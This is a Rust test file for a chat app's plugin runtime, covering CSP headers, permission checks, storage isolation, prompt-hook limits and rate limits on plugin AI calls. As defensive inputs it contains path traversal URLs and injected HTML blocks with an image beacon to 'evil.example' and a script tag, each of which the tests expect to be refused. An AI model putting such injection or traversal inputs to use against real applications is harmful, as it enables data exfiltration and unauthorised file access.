//! 플러그인 런타임 테스트 (CLAUDE.md 6-D-2). 도는 목록이 전역이라 한 테스트 안에서 차례로 확인한다.
use std::path::{Path, PathBuf};

use serde_json::{json, Value};
use tauri::http::Request;

use super::*;
use crate::{db, db::conn::DbPool, service::data::trash};

async fn app_dir() -> (tempfile::TempDir, PathBuf, DbPool) {
    let dir = tempfile::tempdir().unwrap();
    let base = dir.path().join("appdata");
    let db = db::conn::init_pool(base.clone()).await.unwrap();
    (dir, base, db)
}

async fn add(db: &DbPool, base: &Path, root: &Path, id: &str, perms: &[&str], enable: bool) {
    let src = root.join(format!("src-{id}"));
    std::fs::create_dir_all(src.join("img")).unwrap();
    std::fs::write(
        src.join("manifest.json"),
        json!({ "id": id, "name": id, "version": "1.0.0", "apiVersion": 1, "permissions": perms }).to_string(),
    )
    .unwrap();
    std::fs::write(src.join("main.js"), "sandcastle.log('hi')").unwrap();
    std::fs::write(src.join("img/a.png"), b"\x89PNG").unwrap();
    let p = preview(db, base, &src).await.unwrap();
    install(db, base, &src, &p.hash).await.unwrap();
    if enable {
        set_enabled(db, base, id, true, perms.iter().map(|s| s.to_string()).collect()).await.unwrap();
    }
}

fn get_url(path: &str) -> (u16, String, String) {
    let req = Request::builder().uri(format!("{}{path}", runtime::origin())).body(vec![]).unwrap();
    let res = runtime::handle(&req);
    let csp = res
        .headers()
        .get("Content-Security-Policy")
        .map(|v| v.to_str().unwrap().to_string())
        .unwrap_or_default();
    (res.status().as_u16(), String::from_utf8_lossy(res.body()).into_owned(), csp)
}

async fn run_start(db: &DbPool, base: &Path) -> runtime::RuntimeStart {
    runtime::start(&list(db, base).await.unwrap(), base)
}

/// 도는 목록이 전역이라 런타임 테스트는 하나씩
static LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

#[tokio::test]
async fn runtime_serves_and_checks_calls() {
    let _g = LOCK.lock().await;
    let (d, base, db) = app_dir().await;
    add(&db, &base, d.path(), "rt-store", &["storage"], true).await;
    add(&db, &base, d.path(), "rt-plain", &[], true).await;
    add(&db, &base, d.path(), "rt-off", &["storage"], false).await;

    // 시작 전에는 아무것도 주지 않는다 (Lazy)
    runtime::stop_all();
    assert_eq!(get_url("/rt-store/__host").0, 404);

    let started = run_start(&db, &base).await;
    let ids: Vec<&str> = started.plugins.iter().map(|p| p.id.as_str()).collect();
    assert_eq!(ids, ["rt-store", "rt-plain"], "꺼진 플러그인은 시작하지 않음, 설치 순서");
    assert_eq!(started.plugins[0].host_url, runtime::host_url("rt-store"));
    assert_eq!(started.api.get("storage.set"), Some(&Some("storage".to_string())));

    // 서빙
    let (status, body, csp) = get_url("/rt-store/__host");
    assert_eq!(status, 200);
    assert!(body.contains("/__sdk.js") && body.contains("/rt-store/main.js"), "{body}");
    assert!(csp.contains("connect-src 'none'") && csp.contains("frame-src 'none'"), "{csp}");
    assert!(csp.contains("script-src") && !csp.contains("'unsafe-eval'") && !csp.contains("https:"), "{csp}");
    assert!(
        csp.contains(&format!("{}/rt-store/", runtime::origin())) && !csp.contains("rt-plain"),
        "자기 경로만: {csp}"
    );
    assert_eq!(get_url("/__sdk.js").0, 200);
    assert_eq!(get_url("/rt-store/main.js").0, 200);
    assert_eq!(get_url("/rt-store/img/a.png").0, 200);
    for bad in [
        "/rt-store/../rt-plain/main.js",
        "/rt-store/%2e%2e/rt-plain/main.js",
        "/rt-store/manifest.json/../main.js",
        "/rt-off/main.js",
        "/nope/main.js",
        "/rt-store/missing.js",
    ] {
        assert_eq!(get_url(bad).0, 404, "{bad}");
    }

    // 호출: 권한·메서드·저장소
    assert!(call(&db, "rt-store", "storage.set", &json!({ "key": "n", "value": { "a": 1 } })).await.is_ok());
    assert_eq!(call(&db, "rt-store", "storage.get", &json!({ "key": "n" })).await.unwrap(), json!({ "a": 1 }));
    assert_eq!(call(&db, "rt-store", "storage.keys", &Value::Null).await.unwrap(), json!(["n"]));
    let info = call(&db, "rt-store", "app.info", &Value::Null).await.unwrap();
    assert_eq!(info["pluginId"], "rt-store");
    assert_eq!(info["permissions"], json!(["storage"]));
    let err = call(&db, "rt-plain", "storage.get", &json!({ "key": "n" })).await.unwrap_err().to_string();
    assert!(err.contains("권한"), "{err}");
    assert!(call(&db, "rt-store", "fs.read", &Value::Null).await.is_err());
    assert!(call(&db, "rt-off", "log", &json!({ "message": "x" })).await.is_err(), "도는 중이 아닌 플러그인");
    let big = "x".repeat(storage::MAX_VALUE_BYTES + 10);
    assert!(call(&db, "rt-store", "storage.set", &json!({ "key": "big", "value": big })).await.is_err());
    // 플러그인끼리 저장소가 섞이지 않는다
    sqlx::query("INSERT INTO user_plugin_storage (plugin_id, key, value) VALUES ('rt-plain', 'n', '\"other\"')")
        .execute(&db)
        .await
        .unwrap();
    assert_eq!(call(&db, "rt-store", "storage.get", &json!({ "key": "n" })).await.unwrap(), json!({ "a": 1 }));
    call(&db, "rt-plain", "log", &json!({ "level": "warn", "message": "조심" })).await.unwrap();
    assert!(runtime::log_of("rt-plain").iter().any(|l| l.level == "warn" && l.message == "조심"));

    // 끄면 곧바로 내린다
    set_enabled(&db, &base, "rt-plain", false, vec![]).await.unwrap();
    assert_eq!(get_url("/rt-plain/main.js").0, 404);
    assert!(call(&db, "rt-plain", "log", &json!({ "message": "x" })).await.is_err());

    // 오류가 많으면 멈춤 → 다시 시작해도 빠짐 → 다시 켜면 풀림
    for i in 0..30 {
        let _ = call(&db, "rt-store", "report", &json!({ "message": format!("boom {i}") })).await;
    }
    assert!(runtime::is_suspended("rt-store"));
    assert_eq!(get_url("/rt-store/__host").0, 404);
    assert!(call(&db, "rt-store", "storage.keys", &Value::Null).await.is_err());
    assert!(run_start(&db, &base).await.plugins.iter().all(|p| p.id != "rt-store"));
    set_enabled(&db, &base, "rt-store", true, vec!["storage".into()]).await.unwrap();
    assert!(!runtime::is_suspended("rt-store"));
    assert!(run_start(&db, &base).await.plugins.iter().any(|p| p.id == "rt-store"));

    // manifest가 허락보다 많은 권한을 달라고 바뀌면(손으로 고침) 시작하지 않는다
    std::fs::write(
        base.join("plugins/rt-store/manifest.json"),
        json!({ "id": "rt-store", "name": "x", "version": "1.0.0", "apiVersion": 1, "permissions": ["storage", "ai"] }).to_string(),
    )
    .unwrap();
    assert!(run_start(&db, &base).await.plugins.iter().all(|p| p.id != "rt-store"));
    std::fs::write(
        base.join("plugins/rt-store/manifest.json"),
        json!({ "id": "rt-store", "name": "x", "version": "1.0.0", "apiVersion": 1, "permissions": ["storage"] }).to_string(),
    )
    .unwrap();

    // 패널 페이지 (6-D-6): SDK와 <base>를 넣어 준다, 선언하지 않은 패널은 없음
    let src = d.path().join("src-rt-ui");
    std::fs::create_dir_all(src.join("ui")).unwrap();
    std::fs::write(
        src.join("manifest.json"),
        json!({ "id": "rt-ui", "name": "UI", "version": "1", "apiVersion": 1, "permissions": ["ui.panel", "ui.command"],
                "panels": [{ "id": "main", "title": "글자 수", "page": "ui/panel.html" }], "commands": [{ "id": "count", "title": "세기" }] })
        .to_string(),
    )
    .unwrap();
    std::fs::write(src.join("main.js"), "1").unwrap();
    std::fs::write(
        src.join("ui/panel.html"),
        "<!doctype html><html><head><title>p</title></head><body>hi<script src=\"panel.js\"></script></body></html>",
    )
    .unwrap();
    std::fs::write(src.join("ui/panel.js"), "1").unwrap();
    let pv = preview(&db, &base, &src).await.unwrap();
    install(&db, &base, &src, &pv.hash).await.unwrap();
    set_enabled(&db, &base, "rt-ui", true, vec!["ui.command".into(), "ui.panel".into()])
        .await
        .unwrap();
    let started = run_start(&db, &base).await;
    let ui = started.plugins.iter().find(|p| p.id == "rt-ui").unwrap();
    assert_eq!(ui.panels[0].url, format!("{}/rt-ui/__panel/main", runtime::origin()));
    assert_eq!(ui.commands[0].title, "세기");
    let (status, body, csp) = get_url("/rt-ui/__panel/main");
    assert_eq!(status, 200);
    let head_at = body.find("<head>").unwrap();
    assert!(
        body[head_at..].starts_with(&format!(
            "<head><base href=\"{}/rt-ui/ui/\"><script src=\"{}/__sdk.js\">",
            runtime::origin(),
            runtime::origin()
        )),
        "{body}"
    );
    assert!(csp.contains("connect-src 'none'"));
    assert_eq!(get_url("/rt-ui/ui/panel.js").0, 200);
    assert_eq!(get_url("/rt-ui/__panel/other").0, 404);
    assert_eq!(get_url("/rt-plain/__panel/main").0, 404);
    assert_eq!(call(&db, "rt-ui", "app.context", &Value::Null).await.unwrap(), Value::Null);

    // 데이터 읽기·제안 (6-D-3): 권한 종류별, 파일 경로는 주지 않음, 제안은 원본을 바꾸지 않음
    sqlx::query("INSERT INTO characters (id, name, description, avatar) VALUES ('c1', 'Mira', 'desc', 'C:/secret/avatar.png')")
        .execute(&db)
        .await
        .unwrap();
    add(&db, &base, d.path(), "rt-data", &["data.read:character", "data.write:character"], true).await;
    run_start(&db, &base).await;
    let list = call(&db, "rt-data", "data.character.list", &Value::Null).await.unwrap();
    assert_eq!(list[0]["name"], "Mira");
    let one = call(&db, "rt-data", "data.character.get", &json!({ "id": "c1" })).await.unwrap();
    assert_eq!(one["description"], "desc");
    assert!(!one.to_string().contains("secret"), "아바타 경로를 주지 않음: {one}");
    assert!(call(&db, "rt-data", "data.persona.list", &Value::Null).await.is_err(), "다른 종류는 권한 없음");
    assert!(call(&db, "rt-data", "data.chat.messages", &json!({ "conversationId": "x" })).await.is_err());
    let r = call(
        &db,
        "rt-data",
        "data.character.propose",
        &json!({ "id": "c1", "changes": { "description": "better" }, "reason": "r" }),
    )
    .await
    .unwrap();
    assert_eq!(r["status"], "pending");
    let d2: String = sqlx::query_scalar("SELECT description FROM characters WHERE id = 'c1'")
        .fetch_one(&db)
        .await
        .unwrap();
    assert_eq!(d2, "desc");
    let p = crate::service::proposals::get(&db, r["id"].as_str().unwrap()).await.unwrap();
    assert_eq!(p.source, "plugin:rt-data");
    assert!(call(&db, "rt-data", "data.lorebook.propose", &json!({ "id": "b", "changes": { "name": "x" } }))
        .await
        .is_err());

    // 지우면 저장소도 휴지통으로, 되살리면 같이
    let item = uninstall(&db, &base, "rt-store").await.unwrap();
    assert_eq!(get_url("/rt-store/main.js").0, 404);
    let left: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM user_plugin_storage WHERE plugin_id = 'rt-store'")
        .fetch_one(&db)
        .await
        .unwrap();
    assert_eq!(left, 0);
    trash::restore(&db, &base, &item.id).await.unwrap();
    let back: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM user_plugin_storage WHERE plugin_id = 'rt-store'")
        .fetch_one(&db)
        .await
        .unwrap();
    assert_eq!(back, 1);

    runtime::stop_all();
}

#[tokio::test]
async fn postprocess_keeps_original_and_respects_mode() {
    use super::postprocess::{self, PluginNote, PostProcessResult};
    let _g = LOCK.lock().await;
    let (d, base, db) = app_dir().await;
    add(&db, &base, d.path(), "pp-fix", &["messages.process"], true).await;
    add(&db, &base, d.path(), "pp-none", &[], true).await;
    run_start(&db, &base).await;
    for sql in [
        "INSERT INTO conversations (id, title) VALUES ('v1', 'c')",
        r#"INSERT INTO messages (id, conversation_id, seq, role, content, meta) VALUES ('m1', 'v1', 1, 'assistant', 'Hello "x', '{"swipes":[{"content":"Hello \"x"}],"swipeId":0}')"#,
        "INSERT INTO messages (id, conversation_id, seq, role, content) VALUES ('u1', 'v1', 0, 'user', 'hi')",
    ] {
        sqlx::query(sql).execute(&db).await.unwrap();
    }
    let content = |id: &'static str| {
        let db = db.clone();
        async move {
            sqlx::query_scalar::<_, String>("SELECT content FROM messages WHERE id = ?")
                .bind(id)
                .fetch_one(&db)
                .await
                .unwrap()
        }
    };
    let fix = |changed: bool| PostProcessResult {
        plugin_id: "pp-fix".into(),
        changed,
        notes: vec![PluginNote {
            level: "warn".into(),
            text: "따옴표가 닫히지 않음".into(),
        }],
    };

    // 표시만(기본)인 플러그인은 글을 바꾸지 못함 — 메모만
    assert!(postprocess::apply(&db, "m1", "Hello \"x", "Hello \"x\"", &[fix(true)]).await.is_err());
    postprocess::apply(&db, "m1", "Hello \"x", "Hello \"x", &[fix(false)]).await.unwrap();
    assert_eq!(content("m1").await, "Hello \"x");
    let meta: String = sqlx::query_scalar("SELECT meta FROM messages WHERE id = 'm1'").fetch_one(&db).await.unwrap();
    assert!(meta.contains("따옴표가 닫히지 않음"), "{meta}");

    // 자동 고침으로 바꾸면 글이 바뀌고 원문·스와이프가 남음
    postprocess::set_mode(&db, "pp-fix", "fix").await.unwrap();
    postprocess::apply(&db, "m1", "Hello \"x", "Hello \"x\"", &[fix(true)]).await.unwrap();
    assert_eq!(content("m1").await, "Hello \"x\"");
    let meta: Value = serde_json::from_str(
        &sqlx::query_scalar::<_, String>("SELECT meta FROM messages WHERE id = 'm1'")
            .fetch_one(&db)
            .await
            .unwrap(),
    )
    .unwrap();
    assert_eq!(meta["pluginProcess"]["original"], "Hello \"x");
    assert_eq!(meta["pluginProcess"]["changedBy"], json!(["pp-fix"]));
    assert_eq!(meta["swipes"][0]["content"], "Hello \"x\"", "{meta}");

    // 다시 처리해도 처음 원문을 지킴
    postprocess::apply(&db, "m1", "Hello \"x\"", "Hello \"x\"!", &[fix(true)]).await.unwrap();
    let meta: Value = serde_json::from_str(
        &sqlx::query_scalar::<_, String>("SELECT meta FROM messages WHERE id = 'm1'")
            .fetch_one(&db)
            .await
            .unwrap(),
    )
    .unwrap();
    assert_eq!(meta["pluginProcess"]["original"], "Hello \"x");

    // 그 사이 바뀐 글, 권한 없는 플러그인, 사용자 메시지, 글을 바꾼 플러그인이 없는데 다른 글은 거절
    assert!(postprocess::apply(&db, "m1", "stale", "x", &[fix(true)]).await.is_err());
    let none = PostProcessResult {
        plugin_id: "pp-none".into(),
        changed: false,
        notes: vec![],
    };
    assert!(postprocess::apply(&db, "m1", "Hello \"x\"!", "Hello \"x\"!", &[none]).await.is_err());
    assert!(postprocess::apply(&db, "u1", "hi", "hi!", &[fix(true)]).await.is_err());
    assert!(postprocess::apply(&db, "m1", "Hello \"x\"!", "other", &[fix(false)]).await.is_err());

    // 되돌리기 → 처음 원문, 스와이프도
    postprocess::revert(&db, "m1").await.unwrap();
    assert_eq!(content("m1").await, "Hello \"x");
    let meta: Value = serde_json::from_str(
        &sqlx::query_scalar::<_, String>("SELECT meta FROM messages WHERE id = 'm1'")
            .fetch_one(&db)
            .await
            .unwrap(),
    )
    .unwrap();
    assert!(meta.get("pluginProcess").is_none());
    assert_eq!(meta["swipes"][0]["content"], "Hello \"x");
    assert!(postprocess::revert(&db, "m1").await.is_err(), "고친 적 없는 메시지");

    // 고친 뒤 사용자가 또 고치면 되돌리지 않음
    postprocess::apply(&db, "m1", "Hello \"x", "fixed", &[fix(true)]).await.unwrap();
    sqlx::query("UPDATE messages SET content = 'user edit' WHERE id = 'm1'")
        .execute(&db)
        .await
        .unwrap();
    assert!(postprocess::revert(&db, "m1").await.is_err());

    // 꺼진(도는 중이 아닌) 플러그인의 결과는 받지 않음
    set_enabled(&db, &base, "pp-fix", false, vec![]).await.unwrap();
    assert!(postprocess::apply(&db, "m1", "user edit", "x", &[fix(true)]).await.is_err());
    runtime::stop_all();
}

#[tokio::test]
async fn prompt_hook_adds_blocks_within_limits() {
    use super::prompt_hook::{self, PluginPromptAnswer, PromptBlockInput};
    use crate::models::ai_service::{ChatContext, HistoryItem};
    let _g = LOCK.lock().await;
    let (d, base, db) = app_dir().await;

    // 훅을 쓸 플러그인이 없으면 묻지도 않는다
    runtime::stop_all();
    let asked = std::cell::Cell::new(false);
    assert!(prompt_hook::ask("v", None, "hi", |_| {
        asked.set(true);
        true
    })
    .await
    .is_empty());
    assert!(!asked.get());

    add(&db, &base, d.path(), "ph-a", &["prompt.modify"], true).await;
    add(&db, &base, d.path(), "ph-b", &["prompt.modify"], true).await;
    add(&db, &base, d.path(), "ph-none", &[], true).await;
    run_start(&db, &base).await;
    assert_eq!(prompt_hook::hooked_plugins(), ["ph-a", "ph-b"]);

    // 화면이 답하면 그 답을 받는다
    let got = prompt_hook::ask("v1", Some("c1"), "hello", |r| {
        assert_eq!(r.plugins, ["ph-a", "ph-b"]);
        assert_eq!(r.user_input, "hello");
        let id = r.request_id.clone();
        tokio::spawn(async move {
            assert!(prompt_hook::answer(
                &id,
                vec![PluginPromptAnswer {
                    plugin_id: "ph-a".into(),
                    blocks: vec![]
                }]
            ));
        });
        true
    })
    .await;
    assert_eq!(got.len(), 1);

    // 답이 없으면 기다리다 없이 보냄 (기록에 남김)
    let started = std::time::Instant::now();
    assert!(prompt_hook::ask("v1", None, "x", |_| true).await.is_empty());
    assert!(started.elapsed() >= std::time::Duration::from_millis(prompt_hook::PER_PLUGIN_MS));
    assert!(runtime::log_of("ph-a").iter().any(|l| l.message.contains("답이 오지 않아")));

    let mut ctx = ChatContext {
        history: (0..4)
            .map(|i| HistoryItem {
                images: vec![],
                role: "user".into(),
                content: format!("m{i}"),
                source: None,
            })
            .collect(),
        ..Default::default()
    };
    let block = |text: &str, position: &str, depth: Option<u32>| PromptBlockInput {
        text: text.into(),
        position: position.into(),
        depth,
    };
    let used = prompt_hook::apply(
        &mut ctx,
        vec![
            // 순서를 섞어 보내도 설치 순서로
            PluginPromptAnswer {
                plugin_id: "ph-b".into(),
                blocks: vec![block("in history", "history", Some(1)), block(&"긴 ".repeat(3000), "rules", None)],
            },
            PluginPromptAnswer {
                plugin_id: "ph-a".into(),
                blocks: vec![block("rule A", "rules", None), block("", "rules", None)],
            },
            // 권한 없는 플러그인, 부르지 않은 플러그인, 두 번 온 답은 무시
            PluginPromptAnswer {
                plugin_id: "ph-none".into(),
                blocks: vec![block("sneaky", "rules", None)],
            },
            PluginPromptAnswer {
                plugin_id: "ph-a".into(),
                blocks: vec![block("again", "rules", None)],
            },
        ],
    );
    assert_eq!(
        ctx.system_rules,
        vec![
            "[플러그인: ph-a]
rule A"
        ]
    );
    assert_eq!(ctx.history.len(), 5);
    assert_eq!(ctx.history[3].role, "system");
    assert_eq!(
        ctx.history[3].content,
        "[플러그인: ph-b]
in history"
    );
    assert_eq!(
        used.iter().map(|u| (u.plugin_id.as_str(), u.blocks)).collect::<Vec<_>>(),
        [("ph-a", 1), ("ph-b", 1)]
    );
    assert!(!ctx.system_rules.iter().any(|r| r.contains("sneaky") || r.contains("again")));
    assert!(runtime::log_of("ph-b")
        .iter()
        .any(|l| l.message.contains("토큰 상한") || l.message.contains("자를 넘어")));

    // 블록 수 상한
    let mut ctx2 = ChatContext::default();
    let used = prompt_hook::apply(
        &mut ctx2,
        vec![PluginPromptAnswer {
            plugin_id: "ph-a".into(),
            blocks: (0..9).map(|i| block(&format!("b{i}"), "rules", None)).collect(),
        }],
    );
    assert_eq!(used[0].blocks, 5);
    runtime::stop_all();
}

#[tokio::test]
async fn ai_policy_caps_switch_and_limits() {
    use super::ai as plugin_ai;
    let _g = LOCK.lock().await;
    let (d, base, db) = app_dir().await;
    add(&db, &base, d.path(), "ai-a", &["ai"], true).await;
    add(&db, &base, d.path(), "ai-b", &[], true).await;
    run_start(&db, &base).await;

    // 인자 검사: 필요한 글, 상한, 범위 맞추기
    assert!(plugin_ai::parse(&json!({})).is_err());
    assert!(plugin_ai::parse(&json!({ "prompt": "   " })).is_err());
    assert!(plugin_ai::parse(&json!({ "prompt": "x", "system": 3 })).is_err());
    assert!(plugin_ai::parse(&json!({ "prompt": "x".repeat(plugin_ai::MAX_INPUT_CHARS + 1) })).is_err());
    assert!(
        plugin_ai::parse(&json!({ "prompt": "x".repeat(plugin_ai::MAX_INPUT_CHARS), "system": "y" })).is_err(),
        "system도 합쳐서 센다"
    );
    let c = plugin_ai::parse(&json!({ "prompt": " 안녕 ", "system": "규칙", "maxTokens": 999_999, "temperature": 9 })).unwrap();
    assert_eq!(
        (c.prompt.as_str(), c.system.as_deref(), c.max_tokens, c.temperature),
        ("안녕", Some("규칙"), plugin_ai::MAX_OUTPUT_TOKENS, 2.0)
    );
    let c = plugin_ai::parse(&json!({ "prompt": "x" })).unwrap();
    assert_eq!(c.max_tokens, plugin_ai::DEFAULT_MAX_TOKENS);
    assert!(plugin_ai::parse(&json!({ "prompt": "x", "maxTokens": "많이" })).is_err());

    // 자동 실행은 스위치가 켜져 있어야 (기본 꺼짐), 사용자가 누른 실행은 스위치와 상관없이
    let err = plugin_ai::admit(&db, "ai-a", true).await.err().unwrap().to_string();
    assert!(err.contains("자동 AI 호출"), "{err}");
    drop(plugin_ai::admit(&db, "ai-a", false).await.unwrap());
    plugin_ai::set_auto(&db, "ai-a", true).await.unwrap();
    assert!(list(&db, &base).await.unwrap().iter().any(|p| p.id == "ai-a" && p.ai_auto));
    drop(plugin_ai::admit(&db, "ai-a", true).await.unwrap());
    assert!(plugin_ai::set_auto(&db, "nope", true).await.is_err());
    plugin_ai::set_auto(&db, "ai-a", false).await.unwrap();
    assert!(plugin_ai::admit(&db, "ai-a", true).await.is_err());

    // 한 번에 하나: 쥐고 있는 동안은 거절, 놓으면 다시
    let g = plugin_ai::admit(&db, "ai-b", false).await.unwrap();
    let err = plugin_ai::admit(&db, "ai-b", false).await.err().unwrap().to_string();
    assert!(err.contains("끝나지 않았음"), "{err}");
    drop(g);

    // 1분에 MAX_PER_MINUTE번 (위에서 ai-b는 1번 썼다)
    for _ in 1..plugin_ai::MAX_PER_MINUTE {
        drop(plugin_ai::admit(&db, "ai-b", false).await.unwrap());
    }
    let err = plugin_ai::admit(&db, "ai-b", false).await.err().unwrap().to_string();
    assert!(err.contains("너무 잦음"), "{err}");

    // 권한이 없으면 호출 자체를 거절 (ai-b는 ai 권한이 없다), 백엔드 디스패처는 ai.generate를 직접 처리하지 않음
    let err = runtime::check_call("ai-b", "ai.generate").unwrap_err().to_string();
    assert!(err.contains("권한"), "{err}");
    runtime::check_call("ai-a", "ai.generate").unwrap();
    assert!(call(&db, "ai-a", "ai.generate", &json!({ "prompt": "x" })).await.is_err());
    runtime::stop_all();
}

#[tokio::test]
async fn plugin_settings_form_values_and_reserved_keys() {
    use super::manifest::PluginSettingField;
    let _g = LOCK.lock().await;
    let (d, base, db) = app_dir().await;
    let field = |key: &str, kind: &str, default: Option<Value>, options: &[&str]| PluginSettingField {
        key: key.into(),
        kind: kind.into(),
        label: key.into(),
        description: None,
        default,
        options: options.iter().map(|s| s.to_string()).collect(),
    };
    let decl = vec![
        field("name", "text", Some(json!("기본")), &[]),
        field("limit", "number", None, &[]),
        field("on", "toggle", Some(json!(true)), &[]),
        field("mode", "select", None, &["a", "b"]),
    ];
    // 플러그인 행이 있어야 저장소가 이어진다 (FK)
    add(&db, &base, d.path(), "st-a", &["storage"], true).await;
    run_start(&db, &base).await;

    // 아무것도 안 정했으면 기본값
    assert_eq!(
        settings::get(&db, "st-a", &decl).await.unwrap(),
        json!({ "name": "기본", "limit": 0, "on": true, "mode": "a" })
    );
    // 종류에 맞는 값만, 선언한 칸만
    settings::set(&db, "st-a", &decl, "limit", &json!(3.5)).await.unwrap();
    settings::set(&db, "st-a", &decl, "mode", &json!("b")).await.unwrap();
    settings::set(&db, "st-a", &decl, "on", &json!(false)).await.unwrap();
    assert!(settings::set(&db, "st-a", &decl, "mode", &json!("c")).await.is_err());
    assert!(settings::set(&db, "st-a", &decl, "limit", &json!("많이")).await.is_err());
    assert!(settings::set(&db, "st-a", &decl, "on", &json!("yes")).await.is_err());
    assert!(settings::set(&db, "st-a", &decl, "name", &json!("x".repeat(3000))).await.is_err());
    assert!(settings::set(&db, "st-a", &decl, "nope", &json!(1)).await.is_err());
    assert_eq!(
        settings::get(&db, "st-a", &decl).await.unwrap(),
        json!({ "name": "기본", "limit": 3.5, "on": false, "mode": "b" })
    );
    // 플러그인이 보는 값 (settings.get, 권한 없이)
    assert_eq!(
        call(&db, "st-a", "settings.get", &Value::Null).await.unwrap(),
        json!({}),
        "선언이 없는 도는 플러그인은 빈 객체"
    );
    // null이면 기본값으로
    settings::set(&db, "st-a", &decl, "mode", &Value::Null).await.unwrap();
    assert_eq!(settings::get(&db, "st-a", &decl).await.unwrap()["mode"], "a");
    // 선언이 바뀌어 종류가 안 맞는 옛 값은 기본값
    let changed = vec![field("limit", "toggle", None, &[])];
    assert_eq!(settings::get(&db, "st-a", &changed).await.unwrap(), json!({ "limit": false }));

    // 예약 키는 플러그인의 storage API로 읽거나 쓸 수 없다. 키 목록에도 안 보인다
    assert!(call(&db, "st-a", "storage.get", &json!({ "key": "__settings" })).await.is_err());
    assert!(call(&db, "st-a", "storage.set", &json!({ "key": "__settings", "value": { "limit": 99 } }))
        .await
        .is_err());
    assert!(call(&db, "st-a", "storage.delete", &json!({ "key": "__settings" })).await.is_err());
    call(&db, "st-a", "storage.set", &json!({ "key": "mine", "value": 1 })).await.unwrap();
    assert_eq!(call(&db, "st-a", "storage.keys", &Value::Null).await.unwrap(), json!(["mine"]));
    runtime::stop_all();
}

#[tokio::test]
async fn postprocess_refuses_new_html_blocks_and_settings_survive_a_full_store() {
    use super::postprocess::{self, PluginNote, PostProcessResult};
    let _g = LOCK.lock().await;
    let (d, base, db) = app_dir().await;
    add(&db, &base, d.path(), "hb-fix", &["messages.process", "storage"], true).await;
    postprocess::set_mode(&db, "hb-fix", "fix").await.unwrap();
    run_start(&db, &base).await;
    let fix = || PostProcessResult {
        plugin_id: "hb-fix".into(),
        changed: true,
        notes: vec![PluginNote {
            level: "info".into(),
            text: "x".into(),
        }],
    };
    let put = |id: &str, text: &str| {
        let db = db.clone();
        let (id, text) = (id.to_string(), text.to_string());
        async move {
            sqlx::query("INSERT INTO conversations (id, title) VALUES ('hv', 'c') ON CONFLICT DO NOTHING")
                .execute(&db)
                .await
                .unwrap();
            sqlx::query("INSERT INTO messages (id, conversation_id, seq, role, content) VALUES (?, 'hv', (SELECT COALESCE(MAX(seq), 0) + 1 FROM messages), 'assistant', ?)")
                .bind(id)
                .bind(text)
                .execute(&db)
                .await
                .unwrap();
        }
    };
    // 원문에 없던 html 블록을 넣으면 거절 (앱이 그대로 그려 실행될 수 있음)
    let block = |lang: &str, body: &str| {
        format!(
            "```{lang}
{body}
```"
        )
    };
    put("h1", "hello").await;
    let evil = format!(
        "hello
{}",
        block("html", "<img src=\"https://evil.example/?d=1\">")
    );
    let err = postprocess::apply(&db, "h1", "hello", &evil, &[fix()]).await.unwrap_err().to_string();
    assert!(err.contains("HTML 코드 블록"), "{err}");
    // 언어 표시 없이 태그로 시작하는 블록도 마찬가지, 대문자 HTML·htm도
    for e in [block("", "<script>1</script>"), block("HTML", "<p>x</p>"), block("htm", "<p>x</p>")] {
        let e = format!(
            "hello
{e}"
        );
        assert!(postprocess::apply(&db, "h1", "hello", &e, &[fix()]).await.is_err(), "{e}");
    }
    // 원래 있던 html 블록을 그대로 두고 다른 글만 고치는 것은 된다
    let with_block = format!(
        "앞
{}
뒤",
        block("html", "<b>있던</b>")
    );
    put("h2", &with_block).await;
    let edited = with_block.replace('뒤', "뒤!");
    postprocess::apply(&db, "h2", &with_block, &edited, &[fix()]).await.unwrap();
    // 있던 블록의 내용을 바꾸면 새 블록으로 본다
    let altered = edited.replace("<b>있던</b>", "<img src=\"https://evil.example\">");
    assert!(postprocess::apply(&db, "h2", &edited, &altered, &[fix()]).await.is_err());
    // html이 아닌 코드 블록(닫히지 않은 블록 닫기 같은 것)은 괜찮다
    let open_py = String::from(
        "```python
print(1)",
    );
    put("h3", &open_py).await;
    let closed = format!(
        "{open_py}
```"
    );
    postprocess::apply(&db, "h3", &open_py, &closed, &[fix()]).await.unwrap();

    // 저장소를 가득 채워도 사용자의 설정 저장은 된다 (예약 키는 몫에 세지 않음)
    sqlx::query("INSERT INTO user_plugin_storage (plugin_id, key, value) VALUES ('hb-fix', 'fill', ?)")
        .bind("x".repeat(storage::MAX_TOTAL_BYTES as usize - 10))
        .execute(&db)
        .await
        .unwrap();
    assert!(
        call(&db, "hb-fix", "storage.set", &json!({ "key": "more", "value": "y".repeat(100) }))
            .await
            .is_err(),
        "가득 참"
    );
    let decl = vec![super::manifest::PluginSettingField {
        key: "k".into(),
        kind: "text".into(),
        label: "k".into(),
        description: None,
        default: None,
        options: vec![],
    }];
    settings::set(&db, "hb-fix", &decl, "k", &json!("저장됨")).await.unwrap();
    assert_eq!(settings::get(&db, "hb-fix", &decl).await.unwrap()["k"], "저장됨");
    runtime::stop_all();
}

#[test]
fn every_api_permission_is_a_known_permission() {
    for (m, p) in runtime::API {
        if let Some(p) = p {
            assert!(manifest::known_permission(p), "{m}: {p}");
        }
    }
}
